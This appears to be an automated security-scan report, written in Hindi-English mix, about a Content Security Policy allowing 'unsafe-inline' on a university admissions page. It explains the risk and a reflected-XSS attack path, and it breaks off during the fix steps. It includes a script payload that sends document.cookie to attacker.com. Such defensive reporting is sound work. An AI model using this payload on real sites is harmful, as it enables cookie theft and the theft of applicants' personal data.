# PhantomScan Hindi Report
## Target: https://dpsru.edu.in/admissions2026_27

### CSP allows unsafe-inline scripts
1. **Kya hai yeh? (Simple Hindi mein)**  
   Ye ek security gap hai jisme website ka "Content Security Policy" (CSP) naam ka protection system *galat tarike se configure* kiya gaya hai. CSP normally browser ko kahta hai: "Bas yehi sources se JavaScript chalne do." Lekin yahan us policy mein `'unsafe-inline'` likha hai, jo matlab hai: "HTML ke andar likhe gaye `<script>` tags (inline scripts) bhi chalne do." Ye *bahut risk* hai kyunki attackers isse bura JavaScript inject karke users ke browsers mein chalwa sakte hain (jaise ki chori karne wala code, fake login page dikhana, etc.). Isse **XSS (Cross-Site Scripting)** attack hone ki sambhavna badh jaati hai.

2. **Attacker kaise exploit karta hai?**  
   Attacker kariega is tarah:  
   - Pehle uss page (https://dpsru.edu.in/admissions2026_27) ke kisi input field (jaise form mein "Name", "Email", ya search box) ko dhundega jahan user ka input bina sanitize kiye wapas page mein dikhaya jata hai (reflected XSS ke liye).  
   - Fir us field mein malicious JavaScript daalega, jaise: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`  
   - Jab koi victim yeh page open karega aur uss input ko submit karega (jaise form bharke), to browser us input ko HTML ka hissa mankar uss script ko chal dega (kyunki CSP mein `'unsafe-inline'` allowed hai).  
   - Ye script victim ki browser se sensitive data (jaise login cookies, form data) attacker ke server bhej dega. Isse attacker applicant ki personal info chura sakta hai (jaise admissions form ke details).

3. **Is platform ke liye exact fix kya hai?**  
   **CSP header se `'unsafe-inline'` hatao aur uske jagah secure alternatives use karo:**  
   - **Step 1:** Browser ke DevTools (F12) → Network tab → admit2
